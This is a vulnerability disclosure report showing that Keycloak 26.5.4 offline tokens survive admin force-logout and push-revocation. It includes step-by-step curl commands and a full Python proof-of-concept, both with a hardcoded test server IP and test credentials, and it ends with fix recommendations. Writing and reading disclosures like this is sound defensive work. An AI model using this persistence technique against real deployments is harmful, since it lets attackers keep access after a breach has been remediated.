# Finding #3: Offline Token Persistence After Admin Session Revocation

| Field | Value |
|---|---|
| **Severity** | HIGH (CVSS 7.5) |
| **Vulnerability Type** | Improper Session Revocation / Privilege Persistence |
| **Affected Version** | Keycloak 26.5.4 (latest stable, confirmed reproducible) |
| **Affected Components** | Offline Session Management, Token Revocation, Admin REST API |
| **Date** | 2026-02-21 |
| **Researcher** | Anggi Pradana |

---

## Summary

Offline tokens (issued with `offline_access` scope) survive admin force-logout (`POST /users/{id}/logout`) and push-revocation (`POST /push-revocation`). The admin REST API provides no working endpoint to delete individual offline sessions (`DELETE /users/{id}/offline-sessions/{clientId}` returns HTTP 404). This creates a persistent backdoor that survives all standard incident response procedures short of a password change.

---

## Configuration Context

Default Keycloak installation with `offline_access` scope available (included by default). The vulnerability is amplified by default settings:

| Setting | Default Value | Impact |
|---|---|---|
| `revokeRefreshToken` | `false` | Offline tokens are not rotated on use; a single stolen token works indefinitely |
| `offlineSessionMaxLifespanEnabled` | `false` | Offline sessions never expire on their own |
| `offlineSessionIdleTimeout` | 30 days | Only resets when the token is used; actively used tokens never idle out |

No non-default realm or client configuration is required to reproduce.

---

## Detailed Description

When a user obtains an offline token (by requesting `scope=offline_access`), Keycloak stores it as an offline session in a separate persistence layer (database). Unlike regular sessions, offline sessions are **not** affected by any of the standard session management operations available to administrators.

This creates a critical gap in Keycloak's incident response capabilities. When a security team detects a compromised account and performs standard remediation steps, the attacker's offline token continues to function silently.

**Admin action effectiveness on offline tokens:**

| Admin Action | HTTP Response | Effect on Active Sessions | Effect on Offline Token |
|---|---|---|---|
| `POST /admin/realms/{realm}/users/{id}/logout` (force logout) | 204 No Content | All active sessions terminated | **No effect -- token still works** |
| `POST /admin/realms/{realm}/push-revocation` (notBefore) | 200 OK | Sessions before timestamp invalidated | **No effect -- token still works** |
| `DELETE /admin/realms/{realm}/users/{id}/offline-sessions/{clientId}` | **404 Not Found** | N/A | **Endpoint broken -- cannot delete** |
| Change user password (only working mitigation) | N/A | Sessions invalidated | **Invalidates offline token** |

**Root cause:** Offline sessions are stored in a separate persistence layer that is not included in active session operations (logout, push-revocation). The DELETE endpoint for offline sessions returns 404, indicating a missing or broken API route.

---

## Steps to Reproduce

**Prerequisites:**
- Realm: `test`
- Client: `test-confidential` (client secret: `mysecret123`)
- User: `testuser` / `Password123`
- Admin: `admin` / `Admin1234`

### Step 1 -- Attacker obtains offline token

```bash
OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access")
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")

# Verify token type is "Offline"
echo "$OFFLINE_RESP" | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
rt = d['refresh_token']
payload = rt.split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))
print('Token type:', claims.get('typ'))  # Expected: Offline
"
```

**Result:** Token type: `Offline`

### Step 2 -- Verify offline token works (baseline)

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('access_token' in d)"
# Output: True
```

### Step 3 -- Admin forces logout of ALL user sessions

```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID="834f6655-5cb3-46ed-b47e-0e50a139dc6c"
curl -s -o /dev/null -w "Force logout: HTTP %{http_code}" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/logout"
# Output: Force logout: HTTP 204
```

Admin receives 204 (success) -- appears that all sessions have been revoked.

### Step 4 -- Offline token STILL works after force-logout

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('Token still valid:', 'access_token' in d)"
# Output: Token still valid: True
```

**VULNERABLE** -- the offline token survives admin force-logout.

### Step 5 -- Admin pushes notBefore (forced revocation)

```bash
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/push-revocation"
# Output: {}
```

### Step 6 -- Offline token STILL works after push-revocation

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('Token still valid:', 'access_token' in d)"
# Output: Token still valid: True
```

**VULNERABLE** -- the offline token survives push-revocation (notBefore).

### Step 7 -- Admin tries to DELETE offline sessions (fails with 404)

```bash
# Get client UUID
CLIENT_UUID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients?clientId=test-confidential" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

curl -s -o /dev/null -w "DELETE offline sessions: HTTP %{http_code}" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID"
# Output: DELETE offline sessions: HTTP 404
```

**VULNERABLE** -- the admin API endpoint for deleting offline sessions returns 404 Not Found.

### Step 8 -- Verify offline sessions still exist

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('Offline sessions remaining:', len(d))"
# Output: Offline sessions remaining: 1 (or more)
```

The offline sessions persist in the database despite all admin revocation attempts.

---

## Impact

- **Compromised account recovery is incomplete:** When a security team detects a compromised account and forces logout, the attacker's offline token provides continued access without any indication. The admin receives HTTP 204 (success), creating a false sense that the user's sessions have been fully revoked.

- **Infinite persistence:** With default settings (`revokeRefreshToken: false`, `offlineSessionMaxLifespanEnabled: false`), a single stolen offline token grants permanent access until the user's password is explicitly changed. There is no time-based expiry.

- **No admin remediation path:** The admin REST API `DELETE /users/{id}/offline-sessions/{clientId}` endpoint returns 404, meaning administrators cannot revoke individual offline sessions programmatically. There is no documented API to remove specific offline sessions.

- **Bypasses standard incident response:** The `notBefore` push-revocation mechanism, designed for emergency credential invalidation across a realm, has no effect on offline tokens. This bypasses the most aggressive automated revocation tool available to administrators.

---

## Recommendations

1. **Include offline sessions in `POST /users/{id}/logout`:** Force-logout should revoke both active sessions and offline sessions for the target user. Administrators expect "logout all sessions" to mean all sessions.

2. **Fix `DELETE /users/{id}/offline-sessions/{clientId}`:** The endpoint should successfully remove offline sessions. Currently it returns 404, indicating a missing or broken route in the Admin REST API.

3. **Apply notBefore policy to offline sessions:** `POST /push-revocation` should invalidate offline tokens issued before the notBefore timestamp, consistent with its behavior for regular sessions.

4. **Enable `revokeRefreshToken` by default:** Requiring token rotation on each use limits the window of abuse for stolen offline tokens. A stolen token would become invalid after the legitimate client rotates it.

---

## Proof of Concept -- Automated Python Script

**File:** `pocs/poc_f3_offline_token.py`

```python
#!/usr/bin/env python3
"""
Finding #3: Offline Token Persistence After Admin Session Revocation
Severity: HIGH (CVSS 7.5)
Target: Keycloak 26.5.4

Demonstrates that offline tokens survive admin force-logout, push-revocation,
and that the admin API cannot delete individual offline sessions (404).
"""

import http.client
import json
import base64
import argparse
import sys
import urllib.parse

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #3: Offline Token Persistence After Revocation      ║
║  Severity: HIGH (CVSS 7.5)                                   ║
║  Keycloak 26.5.4 — Improper Session Revocation              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def http_post(host, port, path, body, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        hdrs.update(headers)
    conn.request("POST", path, body, hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_get(host, port, path, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {}
    if headers:
        hdrs.update(headers)
    conn.request("GET", path, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_delete(host, port, path, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {}
    if headers:
        hdrs.update(headers)
    conn.request("DELETE", path, headers=hdrs)
    resp = conn.getresponse()
    resp.read()
    status = resp.status
    conn.close()
    return status

def get_token(host, port, realm, body):
    path = f"/realms/{realm}/protocol/openid-connect/token"
    status, data = http_post(host, port, path, body)
    return status, json.loads(data) if data else {}

def get_admin_token(host, port):
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    status, data = get_token(host, port, "master", body)
    return data.get("access_token", "")

def main():
    parser = argparse.ArgumentParser(description="Finding #3: Offline Token Persistence PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    client_id = "test-confidential"
    client_secret = "mysecret123"
    username = "testuser"
    password = "Password123"
    results = []
    print()

    # ── Step 0: Get admin token and user ID ──
    step(0, "Getting admin token and user ID...")
    admin_token = get_admin_token(host, port)
    if not admin_token:
        fail("Failed to get admin token")
        return 1
    success("Admin token obtained")

    auth_hdr = {"Authorization": f"Bearer {admin_token}"}
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users?username={username}", auth_hdr)
    users = json.loads(data)
    user_id = users[0]["id"] if users else None
    if not user_id:
        fail("User not found")
        return 1
    success(f"User ID: {user_id}")

    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/clients?clientId={client_id}", auth_hdr)
    clients = json.loads(data)
    client_uuid = clients[0]["id"] if clients else None
    success(f"Client UUID: {client_uuid}")
    print()

    # ── Step 1: Attacker obtains offline token ──
    step(1, "ATTACKER: Obtaining offline token with compromised credentials...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=password&username={username}&password={password}"
            f"&scope=offline_access")
    status, resp = get_token(host, port, realm, body)
    offline_token = resp.get("refresh_token", "")

    if not offline_token:
        fail(f"Failed to get offline token: {resp}")
        return 1

    # Verify it's really an offline token
    payload_b64 = offline_token.split(".")[1] + "=="
    try:
        claims = json.loads(base64.b64decode(payload_b64))
        token_type = claims.get("typ", "unknown")
    except Exception:
        token_type = "unknown"

    success(f"Offline token obtained (type: {token_type})")
    print(f"    Token: {offline_token[:60]}...")
    print()

    # ── Step 2: Verify offline token works (baseline) ──
    step(2, "Verifying offline token works (baseline)...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        success("Baseline: offline token exchange successful")
    else:
        fail(f"Baseline failed: {resp}")
        return 1
    print()

    # ── Step 3: Admin force-logout ──
    step(3, "ADMIN: Force-logout all user sessions...")
    # Refresh admin token
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}

    logout_status, _ = http_post(host, port,
                                  f"/admin/realms/{realm}/users/{user_id}/logout",
                                  "", auth_hdr)
    print(f"    POST /users/{{id}}/logout: HTTP {logout_status}")

    # Verify active sessions are cleared
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users/{user_id}/sessions", auth_hdr)
    sessions = json.loads(data) if data else []
    success(f"Active sessions remaining: {len(sessions)} (should be 0)")
    print()

    # ── Step 4: Test offline token after force-logout ──
    step(4, "ATTACKER: Testing offline token AFTER admin force-logout...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        fail("VULNERABLE — Offline token STILL WORKS after force-logout!")
        results.append(("After force-logout", True))
    else:
        success("Offline token revoked — not vulnerable")
        results.append(("After force-logout", False))
    print()

    # ── Step 5: Admin push-revocation ──
    step(5, "ADMIN: Pushing not-before revocation policy...")
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}
    push_status, push_resp = http_post(host, port,
                                        f"/admin/realms/{realm}/push-revocation",
                                        "", auth_hdr)
    print(f"    POST /push-revocation: HTTP {push_status}")
    print()

    # ── Step 6: Test offline token after push-revocation ──
    step(6, "ATTACKER: Testing offline token AFTER push-revocation...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        fail("VULNERABLE — Offline token STILL WORKS after push-revocation!")
        results.append(("After push-revocation", True))
    else:
        success("Offline token revoked")
        results.append(("After push-revocation", False))
    print()

    # ── Step 7: Admin tries to DELETE offline sessions ──
    step(7, "ADMIN: Attempting to DELETE offline sessions via API...")
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}

    del_status = http_delete(host, port,
                              f"/admin/realms/{realm}/users/{user_id}/offline-sessions/{client_uuid}",
                              auth_hdr)
    print(f"    DELETE /users/{{id}}/offline-sessions/{{clientId}}: HTTP {del_status}")
    if del_status == 404:
        fail("Admin API returns 404 — cannot delete offline sessions!")
        results.append(("DELETE offline sessions", True))
    else:
        success(f"Endpoint returned {del_status}")
        results.append(("DELETE offline sessions", del_status == 404))
    print()

    # ── Step 8: Verify offline sessions still exist ──
    step(8, "Checking if offline sessions still exist...")
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users/{user_id}/offline-sessions/{client_uuid}",
                            auth_hdr)
    try:
        offline_sessions = json.loads(data)
        count = len(offline_sessions)
    except Exception:
        count = 0
    print(f"    Offline sessions remaining: {count}")
    if count > 0:
        fail(f"Offline sessions persist! ({count} active)")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:35s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - Compromised account recovery is INCOMPLETE — force-logout does not
    revoke offline tokens
  - Push-revocation (notBefore) has NO effect on offline tokens
  - Admin REST API DELETE endpoint returns 404 — no programmatic way to
    revoke individual offline sessions
  - With default settings (no rotation, no expiry), a single offline token
    grants PERMANENT access until password change

{YELLOW}Attack Scenario:{RESET}
  1. Attacker compromises credentials → obtains offline token
  2. Security team detects breach → forces logout (appears successful)
  3. Attacker's offline token remains valid → persistent backdoor
  4. Only password change revokes the offline token

{YELLOW}Root Cause:{RESET}
  Offline sessions are stored in a separate persistence layer that is
  not affected by active session operations (logout, push-revocation).
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests confirm vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

---

## Test Environment

| Property | Value |
|---|---|
| Keycloak Version | 26.5.4 (2026-02-20 release) |
| Distribution | Quarkus (ZIP) |
| Java | OpenJDK 21.0.10 |
| Mode | `start-dev` |
| OS | Ubuntu 24.04 |
| Test Host | 46.101.162.187 |
| Test Realm | `test` |
| Test Client | `test-confidential` (confidential) |
| Test User | `testuser` |

---

*This finding was validated on 2026-02-21 against a fresh Keycloak 26.5.4 instance on a private, researcher-controlled VPS. No production systems, real user data, or third-party infrastructure was accessed.*
